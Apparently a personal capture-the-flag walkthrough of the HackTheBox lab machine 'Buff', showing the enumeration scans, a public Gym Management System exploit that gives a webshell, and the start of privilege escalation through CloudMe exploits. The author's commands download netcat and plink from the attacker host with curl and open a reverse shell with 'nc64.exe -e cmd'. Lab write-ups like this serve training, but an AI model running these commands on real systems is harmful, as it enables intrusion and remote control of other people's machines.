Buff IP:10.10.10.198


rustscan:




nmap:

PORT     STATE SERVICE    REASON  VERSION
7680/tcp open  pando-pub? syn-ack
8080/tcp open  http       syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut




┌──(kali㉿kali)-[~/Practice/HackTheBox/Buff]
└─$ gobuster dir  -u http://10.10.10.198:8080  -w /usr/share/wordlists/dirb/common.txt -t 64 -x php,txt,html 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.198:8080
[+] Threads:        64
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,txt,html
[+] Timeout:        10s
===============================================================
2023/02/21 09:19:38 Starting gobuster
===============================================================
/.hta (Status: 403)
/.hta.php (Status: 403)
/.hta.txt (Status: 403)
/.hta.html (Status: 403)
/.htaccess (Status: 403)
/.htaccess.php (Status: 403)
/.htaccess.txt (Status: 403)
/.htaccess.html (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.php (Status: 403)
/.htpasswd.txt (Status: 403)
/.htpasswd.html (Status: 403)
/About.php (Status: 200)
/about.php (Status: 200)
/admin.cgi (Status: 403)
/admin.cgi.txt (Status: 403)
/admin.cgi.html (Status: 403)
/admin.pl (Status: 403)
/admin.pl.txt (Status: 403)
/admin.pl.html (Status: 403)
/AT-admin.cgi (Status: 403)
/AT-admin.cgi.txt (Status: 403)
/AT-admin.cgi.html (Status: 403)
/aux (Status: 403)
/aux.php (Status: 403)
/aux.txt (Status: 403)
/aux.html (Status: 403)
/boot (Status: 301)
/cachemgr.cgi (Status: 403)
/cachemgr.cgi.txt (Status: 403)
/cachemgr.cgi.html (Status: 403)
/cgi-bin/ (Status: 403)
/cgi-bin/.html (Status: 403)
/com2 (Status: 403)
/com2.html (Status: 403)
/com2.php (Status: 403)
/com2.txt (Status: 403)
/com1 (Status: 403)
/com1.php (Status: 403)
/com1.txt (Status: 403)
/com1.html (Status: 403)
/com3 (Status: 403)
/com3.txt (Status: 403)
/com3.html (Status: 403)
/com3.php (Status: 403)
/con (Status: 403)
/con.html (Status: 403)
/con.php (Status: 403)
/con.txt (Status: 403)
/contact.php (Status: 200)
/Contact.php (Status: 200)
/edit.php (Status: 200)
/ex (Status: 301)
/feedback.php (Status: 200)
/home.php (Status: 200)
/Home.php (Status: 200)
/img (Status: 301)
/include (Status: 301)
/Index.php (Status: 200)
/index.php (Status: 200)
/index.php (Status: 200)
/LICENSE (Status: 200)
/license (Status: 200)
/licenses (Status: 403)
/lpt1 (Status: 403)
/lpt1.txt (Status: 403)
/lpt1.html (Status: 403)
/lpt1.php (Status: 403)
/lpt2 (Status: 403)
/lpt2.php (Status: 403)
/lpt2.txt (Status: 403)
/lpt2.html (Status: 403)
/nul (Status: 403)
/nul.txt (Status: 403)
/nul.html (Status: 403)
/nul.php (Status: 403)
/packages.php (Status: 200)
/phpmyadmin (Status: 403)
/prn (Status: 403)
/prn.php (Status: 403)
/prn.txt (Status: 403)
/prn.html (Status: 403)
/profile (Status: 301)
/register.php (Status: 200)
/server-status (Status: 403)
/server-info (Status: 403)
/up.php (Status: 200)
/upload (Status: 301)
/upload.php (Status: 200)
/webalizer (Status: 403)
===============================================================
2023/02/21 09:22:52 Finished
===============================================================


Visiting the site on port 8080 and going to the Contact page,we get some usefull info:



    mrb3n's Bro Hut
    Made using Gym Management Software 1.0 


searching for an exploit:

┌──(kali㉿kali)-[~/Practice/HackTheBox/Buff]
└─$ searchsploit gym management         
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Gym Management System 1.0 - 'id' SQL Injection                                                                                                                     | php/webapps/48936.txt
Gym Management System 1.0 - Authentication Bypass                                                                                                                  | php/webapps/48940.txt
Gym Management System 1.0 - Stored Cross Site Scripting                                                                                                            | php/webapps/48941.txt
Gym Management System 1.0 - Unauthenticated Remote Code Execution                                                                                                  | php/webapps/48506.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


──(kali㉿kali)-[~/Practice/HackTheBox/Buff]
└─$ python 48506.py http://10.10.10.198:8080/                                                                                                                                                    1 ⨯
            /\
/vvvvvvvvvvvv \--------------------------------------,
`^^^^^^^^^^^^ /============BOKU====================="
            \/

[+] Successfully connected to webshell.
C:\xampp\htdocs\gym\upload> whoami
�PNG
▒
buff\shaun

C:\xampp\htdocs\gym\upload> net users
�PNG
▒

User accounts for \\BUFF

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
shaun                    WDAGUtilityAccount       
The command completed successfully.


C:\xampp\htdocs\gym\upload> type \users\shaun\desktop\user.txt
�PNG
▒
2d35c42b6fbb91cf2ee6ad1b3fca8d46



C:\xampp\htdocs\gym\upload> whoami /priv
�PNG
▒

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled






C:\xampp\htdocs\gym\upload> systeminfo
�PNG
▒

Host Name:                 BUFF
OS Name:                   Microsoft Windows 10 Enterprise
OS Version:                10.0.17134 N/A Build 17134
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          shaun
Registered Organization:   
Product ID:                00329-10280-00000-AA218
Original Install Date:     16/06/2020, 14:05:58
System Boot Time:          21/02/2023, 14:12:21
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 07/08/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,446 MB
Virtual Memory: Max Size:  4,799 MB
Virtual Memory: Available: 2,616 MB
Virtual Memory: In Use:    2,183 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.198
                                 [02]: fe80::7594:c50:1014:ded1
                                 [03]: dead:beef::c06a:b633:2c45:7e97
                                 [04]: dead:beef::7594:c50:1014:ded1
                                 [05]: dead:beef::76
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.



send nc64.exe and plink.exe to the victim machine. HOst the files using python simple server and then copy them using curl.exe

C:\xampp\htdocs\gym\upload> curl.exe http://10.10.14.9:8000/nc64.exe -o nc64.exe
�PNG
▒

C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

21/02/2023  14:45    <DIR>          .
21/02/2023  14:45    <DIR>          ..
21/02/2023  14:22                53 kamehameha.php
21/02/2023  14:45            45,272 nc64.exe
               2 File(s)         45,325 bytes
               2 Dir(s)   7,430,746,112 bytes free

C:\xampp\htdocs\gym\upload> curl.exe http://10.10.14.9:8000/plink.exe -o plink.exe
�PNG
▒

C:\xampp\htdocs\gym\upload> dir
�PNG
▒
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\xampp\htdocs\gym\upload

21/02/2023  14:45    <DIR>          .
21/02/2023  14:45    <DIR>          ..
21/02/2023  14:22                53 kamehameha.php
21/02/2023  14:45            45,272 nc64.exe
21/02/2023  14:45           545,880 plink.exe
               3 File(s)        591,205 bytes
               2 Dir(s)   7,430,193,152 bytes free

C:\xampp\htdocs\gym\upload> 



time to get a better shell:

C:\xampp\htdocs\gym\upload> nc64.exe -e cmd 10.10.14.9 4444


┌──(kali㉿kali)-[~/Practice/HackTheBox/Buff]
└─$ nc -lnvp 4444                       
listening on [any] 4444 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.198] 50012
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\gym\upload>



PRIVESC:


C:\Users\shaun\Downloads>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A22D-49F7

 Directory of C:\Users\shaun\Downloads

14/07/2020  12:27    <DIR>          .
14/07/2020  12:27    <DIR>          ..
16/06/2020  15:26        17,830,824 CloudMe_1112.exe
               1 File(s)     17,830,824 bytes
               2 Dir(s)   7,453,188,096 bytes free

C:\Users\shaun\Downloads>


└─$ searchsploit cloudme                                              
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                                                                                                                             | windows/remote/48389.py
CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)                                                                                                                    | windows/local/48499.txt
CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)                                                                                                                    | windows/local/48840.py
Cloudme 1.9 - Buffer Overflow (DEP) (Metasploit)                                                                                                                   | windows_x86-64/remote/45197.rb
CloudMe Sync 1.10.9 - Buffer Overflow (SEH)(DEP Bypass)                                                                                                            | windows_x86-64/local/45159.py
CloudMe Sync 1.10.9 - Stack-Based Buffer Overflow (Metasploit)                                                                                                     | windows/remote/44175.rb
CloudMe Sync 1.11.0 - Local Buffer Overflow                                                                                                                        | windows/local/44470.py
CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt                                                                                                                    | windows/remote/46218.py
CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass)                                                                                                           | windows_x86-64/remote/46250.py
CloudMe Sync < 1.11.0 - Buffer Overflow                                                                                                                            | windows/remote/44027.py
CloudMe Sync < 1.11.0 - Buffer Overflow (SEH) (DEP Bypass)                                                                                                         | windows_x86-64/remote/44784.py
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
